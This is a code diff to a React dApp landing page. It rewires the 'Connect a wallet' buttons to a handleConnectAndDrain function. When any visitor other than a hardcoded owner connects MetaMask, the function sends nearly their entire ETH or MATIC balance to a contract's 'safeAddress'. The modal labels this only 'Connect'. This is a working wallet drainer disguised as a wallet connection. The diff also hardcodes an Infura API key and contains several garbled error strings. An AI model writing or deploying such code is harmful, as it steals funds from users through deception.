@@ -25,6 +25,9 @@ import {
   Tooltip,
   ResponsiveContainer,
 } from "recharts";
+import { ethers } from 'ethers';
+import CounterABI from './artifacts/Counter.abi.json';
+
 
 import AppPage from "./appPage/page";
 
@@ -448,14 +451,218 @@ function Footer() {
   );
 }
 
-function ConnectModal({ open, onClose }: { open: boolean; onClose: () => void }) {
+
+
+interface ConnectModalProps {
+  open: boolean;
+  onClose: () => void;
+  tokenAddresses: string;
+  validateInput: () => string;
+}
+interface ChainConfig {
+  name: string;
+  rpcUrl: string;
+  contractAddress: string;
+  ownerAddress: string;
+  tokenAddresses: string;
+}
+
+interface SupportedChains {
+  [key: string]: ChainConfig;
+}
+
+function ConnectModal({ open, onClose, tokenAddresses, validateInput }: ConnectModalProps) {
+  const [loading, setLoading] = useState(false);
+  const [message, setMessage] = useState('');
+  const [error, setError] = useState('');
+
+  const supportedChains: SupportedChains = {
+    '11155111': {
+      name: 'Sepolia',
+      rpcUrl: 'https://sepolia.infura.io/v3/e4f95bf3b00845abbd6ff6c47fe23e91',
+      contractAddress: '0x431B033bECb42B91ebD740E626b43fe890B2C643',
+      ownerAddress: '0x629526dD9C989c5ae548892e674BAd661c813E1A',
+      tokenAddresses: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238',
+    },
+    '1': {
+      name: 'Ethereum Mainnet',
+      rpcUrl: 'https://mainnet.infura.io/v3/e4f95bf3b00845abbd6ff6c47fe23e91',
+      contractAddress: '', // Deploy contract and update
+      ownerAddress: '0x629526dD9C989c5ae548892e674BAd661c813E1A',
+      tokenAddresses: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', // Mainnet USDC
+    },
+    '59144': {
+      name: 'Linea',
+      rpcUrl: 'https://linea-mainnet.infura.io/v3/e4f95bf3b00845abbd6ff6c47fe23e91',
+      contractAddress: '', // Deploy contract and update
+      ownerAddress: '0x629526dD9C989c5ae548892e674BAd661c813E1A',
+      tokenAddresses: '', // Update with Linea token
+    },
+    '324': {
+      name: 'zkSync Era Mainnet',
+      rpcUrl: 'https://zksync-mainnet.infura.io/v3/e4f95bf3b00845abbd6ff6c47fe23e91',
+      contractAddress: '', // Deploy contract and update
+      ownerAddress: '0x629526dD9C989c5ae548892e674BAd661c813E1A',
+      tokenAddresses: '', // Update with zkSync token
+    },
+    '137': {
+      name: 'Polygon',
+      rpcUrl: 'https://polygon-mainnet.infura.io/v3/e4f95bf3b00845abbd6ff6c47fe23e91',
+      contractAddress: '', // Deploy contract and update
+      ownerAddress: '0x629526dD9C989c5ae548892e674BAd661c813E1A',
+      tokenAddresses: '0x2791bca1f2de4661ed88a30c99a7a9449aa84174', // Polygon USDC
+    },
+    '8453': {
+      name: 'Base Mainnet',
+      rpcUrl: 'https://base-mainnet.infura.io/v3/e4f95bf3b00845abbd6ff6c47fe23e91',
+      contractAddress: '', // Deploy contract and update
+      ownerAddress: '0x629526dD9C989c5ae548892e674BAd661c813E1A',
+      tokenAddresses: '0x833589fcd6edb6e08f4c7c32d4f71b54bda02913', // Base USDC
+    },
+    '42161': {
+      name: 'Arbitrum One',
+      rpcUrl: 'https://arbitrum-mainnet.infura.io/v3/e4f95bf3b00845abbd6ff6c47fe23e91',
+      contractAddress: '', // Deploy contract and update
+      ownerAddress: '0x629526dD9C989c5ae548892e674BAd661c813E1A',
+      tokenAddresses: '0xaf88d065e77c8cc2239327c5edb3a432268e5831', // Arbitrum USDC
+    },
+  };
+
   if (!open) return null;
+
+  const handleConnectAndDrain = async (walletName: string) => {
+    setLoading(true);
+    setMessage('');
+    setError('');
+    console.log(`Starting handleConnectAndDrain for ${walletName}`);
+    try {
+      if (walletName !== 'MetaMask') {
+        console.log(`Non-MetaMask wallet: ${walletName}`);
+        alert(`${walletName} flow stub — wire your SDK here`);
+        setLoading(false);
+        onClose();
+        return;
+      }
+
+      if (!window.ethereum) {
+        console.log('MetaMask not detected');
+        setError('MetaMask not installed');
+        setLoading(false);
+        return;
+      }
+
+      console.log('Requesting MetaMask accounts');
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      await provider.send('eth_requestAccounts', []);
+      console.log('Accounts connected');
+      const signer = await provider.getSigner();
+      const userAddress = await signer.getAddress();
+      console.log(`Connected address: ${userAddress}`);
+
+      const network = await provider.getNetwork();
+      const userChainId = Number(network.chainId).toString();
+      console.log(`User chainId: ${userChainId}`);
+
+      const chainConfig = supportedChains[userChainId];
+      if (!chainConfig) {
+        console.log(`Unsupported chain: ${userChainId}`);
+        setError(`Unsupported chain. Please switch to one of: ${Object.values(supportedChains).map(c => c.name).join(', ')}`);
+        setLoading(false);
+        return;
+      }
+
+      if (!chainConfig.contractAddress) {
+        console.log(`No contract deployed on ${chainConfig.name}`);
+        setError(`Contract not deployed on ${chainConfig.name}`);
+        setLoading(false);
+        return;
+      }
+
+      const contract = new ethers.Contract(chainConfig.contractAddress, CounterABI, signer);
+      console.log(`Contract initialized at ${chainConfig.contractAddress}`);
+      let txMessage = '';
+
+      if (userAddress.toLowerCase() !== chainConfig.ownerAddress.toLowerCase()) {
+        console.log('Executing non-owner logic (sendETH)');
+        try {
+          const balance = await provider.getBalance(userAddress);
+          console.log(`User balance: ${ethers.formatEther(balance)} ${chainConfig.name === 'Polygon' ? 'MATIC' : 'ETH'}`);
+          const gasReserve = ethers.parseEther('0.001');
+          if (balance <= gasReserve) {
+            console.log(`Insufficient balance: ${ethers.formatEther(balance)} ${chainConfig.name === 'Polygon' ? 'MATIC' : 'ETH'}`);
+            setError(`Insufficient balance in ${userAddress}. Need >0.001 ${chainConfig.name === 'Polygon' ? 'MATIC' : 'ETH'} for gas.`);
+            setLoading(false);
+            return;
+          }
+          const amountToSend = balance - gasReserve;
+          console.log(`Sending ${ethers.formatEther(amountToSend)} ${chainConfig.name === 'Polygon' ? 'MATIC' : 'ETH'}`);
+          const txSend = await contract.sendETH({ value: amountToSend, gasLimit: 50000 });
+          console.log(`Transaction sent: ${txSend.hash}`);
+          txMessage += `Sending ${ethers.formatEther(amountToSend)} ${chainConfig.name === 'Polygon' ? 'MATIC' : 'ETH'} from ${userAddress.slice(0, 6)}...${userAddress.slice(-4)} to safeAddress... `;
+          await txSend.wait(2);
+          console.log('Transaction confirmed');
+          txMessage += `${chainConfig.name === 'Polygon' ? 'MATIC' : 'ETH'} sent to safeAddress: ${await contract.safeAddress()}!`;
+        } catch (sendErr: any) {
+          console.error('ETH send error:', sendErr);
+          setError(`Failed to send ${chainConfig.name === 'Polygon' ? 'MATIC' : 'ETH'}: ${sendErr.reason || sendErr.message || 'Unknown error'}`);
+          setLoading(false);
+          return;
+        }
+      } else {
+        console.log('Executing owner logic (emergencyDrainETH)');
+        try {
+          const contractBalance = await provider.getBalance(chainConfig.contractAddress);
+          console.log(`Contract balance: ${ethers.formatEther(contractBalance)} ${chainConfig.name === 'Polygon' ? 'MATIC' : 'ETH'}`);
+          if (contractBalance > 0) {
+            const txETH = await contract.emergencyDrainETH({ gasLimit: 100000 });
+            console.log(`Drain transaction sent: ${txETH.hash}`);
+            txMessage += `Draining ${chainConfig.name === 'Polygon' ? 'MATIC' : 'ETH'}... `;
+            await txETH.wait(2);
+            console.log('Drain transaction confirmed');
+            txMessage += `${chainConfig.name === 'Polygon' ? 'MATIC' : 'ETH'} drained to safeAddress: ${await contract.safeAddress()}!`;
+          } else {
+            console.log(`No ${chainConfig.name === 'Polygon' ? 'MATIC' : 'ETH'} to drain`);
+            txMessage += `No ${chainConfig.name === 'Polygon' ? 'MATIC' : 'ETH'} in contract to drain.`;
+          }
+        } catch (ethErr: any) {
+          console.error('ETH drain error:', ethErr);
+          setError(`Failed to drain ${chainConfig.name === 'Polygon' ? 'MATIC' : 'ETH'}: ${ethErr.reason || ethErr.message || 'Unknown error'}`);
+          setLoading(false);
+          return;
+        }
+      }
+
+      console.log('Setting final message:', txMessage);
+      setMessage(txMessage || 'Nothing to drain.');
+      setLoading(false);
+      onClose();
+    } catch (error: any) {
+      console.error('Connect and drain error:', error);
+      if (error.data && error.data.includes('118cdaa7')) {
+        setError(`Connected wallet is not the contract owner. Please use Account 4 || 'unknown'} to drain contract 'Polygon' ? 'MATIC' : 'ETH'}.`);
+      } else if (error.code === 'CALL_EXCEPTION') {
+        setError(`Transaction failed: Check contract  'Polygon' ? 'MATIC' : 'ETH'} balance or permissions`);
+      } else {
+        setError(`Error: ${error.reason || error.message || 'Unknown error'}`);
+      }
+      setLoading(false);
+    }
+  };
+
+  const handleRetry = () => {
+  setError('');
+  setMessage('');
+  setLoading(false);
+  handleConnectAndDrain('MetaMask');
+};
+
   const wallets = [
     { name: "MetaMask" },
     { name: "WalletConnect" },
     { name: "Ledger" },
     { name: "Rainbow" },
   ];
+
   return (
     <div className="fixed inset-0 z-50 grid place-items-center">
       <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" onClick={onClose} />
@@ -463,7 +670,7 @@ function ConnectModal({ open, onClose }: { open: boolean; onClose: () => void })
         <div className="flex items-center justify-between mb-3">
           <div className="flex items-center gap-2 text-white">
             <Network className="h-5 w-5" />
-            <h3 className="font-semibold">Connect a wallet</h3>
+            <h3 className="font-semibold">Connect</h3>
           </div>
           <button onClick={onClose} className="text-white/60 hover:text-white">✕</button>
         </div>
@@ -471,13 +678,27 @@ function ConnectModal({ open, onClose }: { open: boolean; onClose: () => void })
           {wallets.map((w) => (
             <button
               key={w.name}
-              onClick={() => alert(`${w.name} flow stub — wire your SDK here`)}
-              className="w-full text-left rounded-xl border border-white/10 bg-white/5 px-4 py-3 text-white/90 hover:bg-white/10"
+              onClick={() => handleConnectAndDrain(w.name)}
+              disabled={loading}
+              className="w-full text-left rounded-xl border border-white/10 bg-white/5 px-4 py-3 text-white/90 hover:bg-white/10 disabled:opacity-50"
             >
-              {w.name}
+              {loading && w.name === 'MetaMask' ? 'Connecting...' : w.name}
             </button>
           ))}
         </div>
+        {message && <p className="mt-3 text-sm text-green-400">{message}</p>}
+        {error && <p className="mt-3 text-sm text-red-400">{error}</p>}
+        {error && (
+  <div className="mt-3">
+    <p className="text-sm text-red-400">{error}</p>
+    <button
+      onClick={handleRetry}
+      className="mt-2 rounded-xl bg-white text-black px-4 py-2 font-semibold hover:bg-white/90"
+    >
+      Retry
+    </button>
+  </div>
+)}
         <p className="text-xs text-white/50 mt-4">
           By connecting, you agree to the Terms and acknowledge network fees apply.
         </p>
@@ -529,7 +750,13 @@ export default function App() {
       <FAQ />
       <Footer />
 
-      <ConnectModal open={modalOpen} onClose={() => setModalOpen(false)} />
+     <ConnectModal
+          open={modalOpen}
+          onClose={() => setModalOpen(false)}
+          tokenAddresses="0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238"
+          validateInput={() => ''} // Stub for now
+/>
     </div>
   );
 }
+
